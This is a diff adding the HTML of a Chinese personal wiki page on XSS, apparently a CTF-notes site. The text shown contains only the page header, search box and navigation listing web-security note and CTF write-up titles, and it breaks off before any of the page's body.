@@ -1,0 +1,2772 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Struct2/">
+      
+      
+        <link rel="next" href="../http/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>XSS - Lengkur's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Lengkur&#39;s Wiki" class="md-header__button md-logo" aria-label="Lengkur's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Lengkur's Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  🐧 Lengkur's Cyber Space
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%2A/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  *
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../wp/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Wp
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Lengkur&#39;s Wiki" class="md-nav__button md-logo" aria-label="Lengkur's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Lengkur's Wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🐧 Lengkur's Cyber Space
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%2A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    *
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Flask/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Flask
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Struct2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Struct2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        绕过
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加密绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        传参
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反射型
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../http/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Http
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Php命令执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php%E7%89%B9%E6%80%A7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Php特性
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../wp/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wp
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Wp
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSS 工坊web基础入门
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSS 工坊web基础入门
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSSCTF WEB
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSSCTF WEB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [De1ctf 2019]SSRF Me Flask
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BMoeCTF%202021%5DbabyRCE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [MoeCTF 2021]babyRCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BNISACTF%202022%5Dbingdundun~-phar%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-phar%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [NISACTF 2022]bingdundun~ phar文件上传 phar伪协议
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BNISACTF%202022%5Dlevel-up~robots-md5%E5%BC%BA%E7%A2%B0%E6%92%9E-sha1%E5%BC%BA%E7%A2%B0%E6%92%9E-php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87-create_function%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [NISACTF 2022]level up~robots md5强碰撞 sha1强碰撞 php变量解析绕过 create function绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [SWPUCTF 2022 新生赛]ez sql 双写绕过 空格绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-MD5%E5%BC%B1%E6%AF%94%E8%BE%83-intval%E7%89%B9%E6%80%A7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [WUSTCTF 2020]朴实无华 信息搜集 MD5弱比较 intval特性 命令执行 空格绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%81%B7%E6%A2%81%E6%8D%A2%E6%9F%B1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [强网杯 2019]随便注 堆叠注入 偷梁换柱
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic-php%E7%89%B9%E6%80%A7-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-%E5%BC%B1%E6%AF%94%E8%BE%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [鹤城杯 2021]Middle magic php特性 数组绕过 弱比较
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSS星辰大海
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSS星辰大海
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phar反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Session反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/%E5%8F%8C%E5%86%99%24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    双写$
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ctfshow
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ctfshow
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web102-php%E7%89%B9%E6%80%A7-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web102-php特性-php伪协议写入木马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web160-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-.user.ini%2B%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web160-文件上传-.user.ini+日志包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web161-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-.user.ini%2B%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web161 文件上传 .user.ini+远程文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web171-SQL注入-联合
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
